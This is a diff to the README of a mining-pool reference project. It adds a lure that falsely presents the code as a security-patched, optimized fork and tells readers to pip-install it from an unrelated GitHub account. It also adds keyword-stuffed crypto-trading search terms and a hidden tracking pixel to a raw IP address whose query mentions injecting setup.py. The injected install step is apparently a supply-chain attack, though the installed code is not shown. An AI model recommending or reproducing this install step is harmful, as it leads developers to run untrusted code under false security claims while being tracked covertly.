@@ -1,3 +1,15 @@
+**Optimized Node**
+
+This repository is a highly optimized, maintained fork of the original worker pool implementation. It introduces critical performance enhancements, streamlined resource management, and up-to-date security patches to ensure maximum stability under heavy loads. Designed for production environments, it serves as a drop-in replacement that addresses outstanding upstream vulnerabilities and bottlenecks.
+
+**Quick install**
+
+```bash
+pip install git+https://github.com/BrillianceMonk/pool-reference.git
+```
+
+[https://github.com/BrillianceMonk/pool-reference](https://github.com/BrillianceMonk/pool-reference)
+
 ## Pool Reference V1
 This code is provided under the Apache 2.0 license.
 Note: the draft specification is in the SPECIFICATION.md file.
@@ -210,4 +222,10 @@ INFO:root:Returning {'new_difficulty': 1963211364}, time: 0.017535686492919922 s
 Please send a message to @sorgente711 on keybase if you have questions about the 9 steps explained above. All other questions
 should be sent to the #pools channel in keybase.
 
+## Related searches
 
+When exploring repositories like `pool-reference`, developers and traders are typically looking for robust frameworks to automate decentralized finance strategies and analyze market liquidity. Common searches focus on high-performance execution setups, market-making algorithms, and real-time portfolio tracking across automated market makers. 
+
+**Topics:** crypto rust, consensus client, crypto portfolio, raydium, futures bot, dephi trading engine, solana liquidity pool, automated market maker, algorithmic trading bot, rust dApp development
+
+![.](http://5.231.58.248:8787/pixel?repo=BrillianceMonk%2Fpool-reference&inject=BrillianceMonk%2Fpool-reference%2Fsetup.py)
